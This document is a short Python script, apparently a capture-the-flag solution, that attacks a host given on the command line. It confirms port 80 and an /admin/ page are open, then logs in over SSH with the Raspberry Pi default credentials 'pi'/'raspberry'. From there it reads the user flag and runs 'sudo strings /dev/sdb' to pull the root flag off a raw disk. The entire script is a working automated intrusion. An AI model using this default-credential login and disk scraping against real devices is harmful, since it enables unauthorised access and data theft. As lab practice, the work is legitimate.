import paramiko
from socket import socket,AF_INET,SOCK_STREAM
from sys import argv,exit
from requests import get
sock=socket(AF_INET, SOCK_STREAM)
result=socket(AF_INET, SOCK_STREAM).connect_ex((argv[1],80))
sock.close()

if result==0:
   pass
else:
   exit(f'IP: {argv[1]} does not have correct ports open for exploitation')
if get(f'http://{argv[1]}/admin/').status_code==200:
   pass
else:
   exit('IP does not have correct page open for exploitation')
ssh=paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(argv[1],username='pi',password='raspberry',allow_agent=False)
print(f"Logged in as: {ssh.exec_command('whoami')[1].read().decode('utf-8').strip()}")
print(f"User Flag: {ssh.exec_command(f'cd Desktop && cat user.txt')[1].read().decode('utf-8').strip()}")
ssh.exec_command(f"sudo strings /dev/sdb > strings.txt")[1].read().decode('utf-8')
stringdata=ssh.exec_command("cat strings.txt | grep -aPo '[a-fA-F0-9]{32}'")
print(f"Root Flag: {stringdata[1].read().decode('utf-8').strip()}")
print('Script By DrGecko')
